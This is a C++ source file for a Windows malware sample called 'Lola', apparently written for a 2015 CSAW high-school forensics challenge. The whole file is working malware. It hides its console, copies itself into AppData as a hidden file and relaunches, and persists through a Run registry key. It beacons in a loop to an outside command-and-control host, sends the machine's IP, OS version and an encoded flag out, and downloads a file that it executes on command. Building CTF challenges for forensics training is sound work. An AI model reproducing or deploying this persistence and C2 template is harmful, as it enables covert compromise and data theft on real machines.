/*
 * Lola Malware
 *
 * Nick Anderson - 2015
 *
 * This malware was written for the 2015 CSAW High School forensics challenge.
 *
 *  
 */

#include <sstream>
#include <iostream>
#include <stdio.h>
#include <string>
#include <stdlib.h>
#include <Shlwapi.h>
#include <ShlObj.h>
#include <urlmon.h>
#include <WinInet.h>
#include <shellapi.h>

using namespace std;

#define OS_VERSION_BUFFER_SIZE 0x80
#define MAX_URI_BUFFER_SIZE 0x500
#define FLAG_LENGTH 35
#define IP_BUFFER_SIZE 0x20
#define XOR_KEY 0x42
#define MAX_C2_BUFF_SIZE 0x500

/* The flag is: flag_{l0la_w4nts_t0_n0m_y3r_warez} */
// Flag encrypted with the XOR key, 0x42
BYTE FLAG[] = {"\x24\x2e\x23\x25\x1d\x39\x2e\x72\x2e\x23\x1d\x35\x76\x2c\x36\x31\x1d\x36\x72\x1d\x2c\x72\x2f\x1d\x3b\x71\x30\x1d\x35\x23\x30\x27\x38\x3f\x0"};
char IP[IP_BUFFER_SIZE];
wchar_t* ROAMINGAPPDATAEXEC = new wchar_t[MAX_PATH];
wchar_t* ROAMINGAPPDATAPATH = new wchar_t[MAX_PATH];
const LPCSTR C2DOM = "https://www.socialmalware.io/static/hsf/L0la.jpg";
const LPCTSTR USERAGENT = L"L0la-zilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like da l0las :3";
char* CFG_URI = "https://www.socialmalware.io/static/hsf/cfg.dat";
char L0LA_IMG_PATH[MAX_PATH];
char C2_BUFF[MAX_C2_BUFF_SIZE];

/* Decrypt the flag blob */
void decrypt(BYTE* flag){

	for(size_t i = 0; flag[i] != 0x0; i++){
		flag[i] = flag[i] ^ XOR_KEY;
	}
}

/* Grab our external IP address from canhazip.com */
void get_ip()
{
	HINTERNET hInternet, hFile;
	DWORD rsize;

	hInternet = InternetOpen(USERAGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	hFile = InternetOpenUrlA(hInternet, "https://canhazip.com/", NULL, 0, INTERNET_FLAG_RELOAD, 0);
	InternetReadFile(hFile, &IP, IP_BUFFER_SIZE, &rsize);

	InternetCloseHandle(hFile);
	InternetCloseHandle(hInternet);
}

/* 
	This functions only job should be to move itself, the exe, to APPDATA
	and relaunch itself

	NOTE: We honestly don't care about return value. If the file already exists
	the CopyData function will fail, however this is the same as if we aren't
	able to write. So we don't do anything with the return value.

	Returns EXIT_FAILURE on fail
	Returns EXIT_SUCCESS on success
*/
int hide(const wchar_t* epath){
	
	int ret = 0;
	HINSTANCE sret = NULL;

	/* Set the Hidden Attribute */
	SetFileAttributes(epath,FILE_ATTRIBUTE_HIDDEN);
	
	/* Copy the file to Roaming APPDATA */
	if( SUCCEEDED( SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &ROAMINGAPPDATAPATH) ) )
	{
		/* Tmp vars for file writing */
		HANDLE hFile;
		char oldFilePath[MAX_PATH];

		/* For use with Writing/Creating/Deleting the old .exe */
		wstringstream tmpfilepath;
		tmpfilepath << ROAMINGAPPDATAPATH << L"\\old_exec" << L'\x00';
		wstring oldExecFileStore = tmpfilepath.str();

		wstringstream wss;
		wss << ROAMINGAPPDATAPATH << L"\\lola.exe" << L'\x00';
		wstring destPath = wss.str();
		ret = CopyFile(epath, const_cast<LPWSTR>(destPath.c_str()), TRUE);

		/* Save the exe path */
		memset(ROAMINGAPPDATAEXEC, 0x0, sizeof(ROAMINGAPPDATAEXEC));
		for(size_t i = 0; i < destPath.size(); i++){
			ROAMINGAPPDATAEXEC[i] = destPath[i];
		}

		if(!ret)
		{
			/* delete the previously running executable */
			DWORD numbytesread;
			hFile = CreateFile(const_cast<LPWSTR>(oldExecFileStore.c_str()),GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);
			memset(oldFilePath, 0x0, MAX_PATH);
			ReadFile(hFile, oldFilePath, MAX_PATH-1, &numbytesread, NULL);

			Sleep(100);
			
			ret = DeleteFileA(oldFilePath);
		}
		else
		{
			/* Create and write our current execution path to a file alongside the new file we'll execute */
			size_t r = 0;
			DWORD written;
			hFile = CreateFile(const_cast<LPWSTR>(oldExecFileStore.c_str()),GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_HIDDEN, NULL);
			char mb_epath[MAX_PATH];
			memset(mb_epath, 0x0, MAX_PATH);
			wcstombs_s(&r, mb_epath, MAX_PATH, epath, MAX_PATH);
			mb_epath[MAX_PATH-1] = '\x0';
			WriteFile(hFile, mb_epath, MAX_PATH, &written, NULL);
			CloseHandle(hFile);
			sret = ShellExecute( NULL, L"open", const_cast<LPWSTR>(destPath.c_str()), NULL, NULL, 0 );
			exit(0);
		}
		return EXIT_SUCCESS;
	}
	else
	{
		return EXIT_FAILURE;
	}
}

/*
 * Make Lola persist.  To do this we write a new reg key :3  Pretty obvious.
 */
int persist()
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH*2;
	wchar_t szValue[count] = {};

	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, ROAMINGAPPDATAEXEC);
	wcscat_s(szValue, count, L"\" ");

	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if(fSuccess) // Registry key was successfully created
	{
		dwSize = (wcslen(szValue)+1)*2;
		lResult = RegSetValueExW(hKey, L"lola", 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}
	else
	{
		return EXIT_FAILURE;
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	if (fSuccess)
	{
		return EXIT_SUCCESS;
	}
	return EXIT_FAILURE;
}

int beacon()
{
	HRESULT hRes;
	wchar_t* szDestPath[MAX_PATH];
	memset(szDestPath, 0x0, sizeof(szDestPath));

	if( SUCCEEDED( SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, szDestPath) ) )
	{
		// Misc variables
		DWORD len;
		size_t ret;
		BOOL cryptRet;
		
		// Buffer for the encoded flag
		LPSTR flagbuff_encoded;

		// Buffers for the encoded IP address
		LPSTR ipbuff_encoded;
		BYTE IPb[IP_BUFFER_SIZE];
		
		// Buffer for the encoded OS Version information
		LPSTR os_ver_encoded;
		char ver_info[OS_VERSION_BUFFER_SIZE];
		
		OSVERSIONINFO osvi;

		// Used to convert wide/narrow strings in Windows. Destination path for file download.
		wstringstream wss;

		// Used to get further instructions in InternetOpen
		HINTERNET hInternet, hFile;
		DWORD rsize;
		char uri[MAX_URI_BUFFER_SIZE];

		// Init buffers to null
		memset(L0LA_IMG_PATH, 0x0, sizeof(L0LA_IMG_PATH));
		memset(uri, 0x0, MAX_URI_BUFFER_SIZE);
		memset(IPb, 0x0, IP_BUFFER_SIZE);
		memset(ver_info, 0x0, OS_VERSION_BUFFER_SIZE);
		

		/* Decrypt the flag */
		decrypt(FLAG);
		cryptRet = CryptBinaryToStringA(FLAG, FLAG_LENGTH, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &len);
		flagbuff_encoded = (LPSTR)malloc(len); // b64 container for the flag
		cryptRet = CryptBinaryToStringA(FLAG, FLAG_LENGTH, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, flagbuff_encoded, &len);

		/* Get the OS Version, we'll send the major and minor values */
		GetVersionEx(&osvi);
		ret = sprintf_s(ver_info, OS_VERSION_BUFFER_SIZE, "M:%d_m:%d_B:%d_P:%d", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber, osvi.dwPlatformId);
		BYTE* ver_infob = (BYTE*)malloc(strlen(ver_info));
		memset(ver_infob, 0x0, sizeof(ver_infob));
		for(size_t i = 0; i < strlen(ver_info); i++)
			ver_infob[i] = ver_info[i];
		ver_infob[strlen(ver_info)] = 0x0;
		cryptRet = CryptBinaryToStringA(ver_infob, strlen(ver_info), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &len);
		os_ver_encoded = (LPSTR)malloc(len);
		cryptRet = CryptBinaryToStringA(ver_infob, strlen(ver_info), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, os_ver_encoded, &len);

		/* Get the external IP address */
		get_ip();
		for(size_t i = 0; i < IP_BUFFER_SIZE; i++)
			IPb[i] = IP[i];
		cryptRet = CryptBinaryToStringA(IPb, IP_BUFFER_SIZE, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &len);
		ipbuff_encoded = (LPSTR)malloc(len);
		cryptRet = CryptBinaryToStringA(IPb, IP_BUFFER_SIZE, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, ipbuff_encoded, &len);

		/* Setup the destination path for the download */
		wss << ROAMINGAPPDATAPATH << L"\\lola.jpg";
		wstring tmpDestPath = wss.str();
		memset(L0LA_IMG_PATH, 0x0, sizeof(L0LA_IMG_PATH));
		wcstombs_s(&ret, L0LA_IMG_PATH, tmpDestPath.c_str(), sizeof(L0LA_IMG_PATH));

		/* Go get C2 instructions ;3 */
		hRes = URLDownloadToFileA(NULL, C2DOM, L0LA_IMG_PATH, 0, NULL);


		/* Construct the full URI.  This will exfill the data, and get additional information*/
		// flag beacon: uri?ex=<b64 flag>&ip=<b64 ip>&ver=<b64 of OS info>
		ret = sprintf_s(uri, MAX_URI_BUFFER_SIZE, "%s?ex=%s&ip=%s&ver=%s", CFG_URI, flagbuff_encoded, ipbuff_encoded, os_ver_encoded);
		hInternet = InternetOpen(USERAGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		hFile = InternetOpenUrlA(hInternet, uri, NULL, 0, INTERNET_FLAG_RELOAD, 0);
		if(hFile == NULL)
		{
			//cerr << "[-] There was an error opening the URI: "  << GetLastError() << endl;
		}
		InternetReadFile(hFile, &C2_BUFF, MAX_C2_BUFF_SIZE, &rsize);
		C2_BUFF[rsize] = '\x0'; // ensure that we null terminate the values read :P

		InternetCloseHandle(hFile);
		InternetCloseHandle(hInternet);

		return EXIT_SUCCESS; // Change this to the integer value read from the server.
	}

	return EXIT_FAILURE;
}


/* Main :P */
int main(int argc, char* argv[]){
	
	/* Hide the console window */
	ShowWindow( GetConsoleWindow(), SW_HIDE );

	/* locals */
	size_t c2comm = 0;
	size_t convChars = 0;
	size_t ret = 0;
	wchar_t execPath[MAX_PATH];

	memset(execPath, 0x0, sizeof(execPath));

	mbstowcs_s(&convChars, execPath, argv[0], MAX_PATH); // TODO: This is a bug :P

	/* Hide */
	if( hide(execPath) == EXIT_FAILURE )
	{
		/* Unable to copy exe to APPDATA */
		//cerr << "[-] Unable to copy Lola to APPDATA and/or Lola already exists in APPDATA!" << endl;
		return EXIT_FAILURE;
	}

	/* Persist */
	if( persist() )
	{
		//cerr << "[-] Lola wasn't able to persist!" << endl;
		return EXIT_FAILURE;
	}

	while(true)
	{
		/* Ask C2 what to do next */
		c2comm = beacon();
		
		if(c2comm == EXIT_SUCCESS)
		{
			BYTE instruction = C2_BUFF[0];

			/* TODO: Add more functionality as desired. As this is a simple CTF challenge,
			we really don't do much.  This code is left here as the template for the C2
			actions. */
			switch(instruction)
			{
			case 0x31:

				ShellExecuteA(0, 0, L0LA_IMG_PATH, 0, 0 , SW_SHOW );
				Sleep(20000);
				break;

			default:
				Sleep(30000);
			}

		}
		else
		{
			Sleep(300000);
		}

		// There's currently a, nay, many, memory leaks :P
		//delete ROAMINGAPPDATAEXEC;
		//delete ROAMINGAPPDATAPATH;
	}
	return 0;
}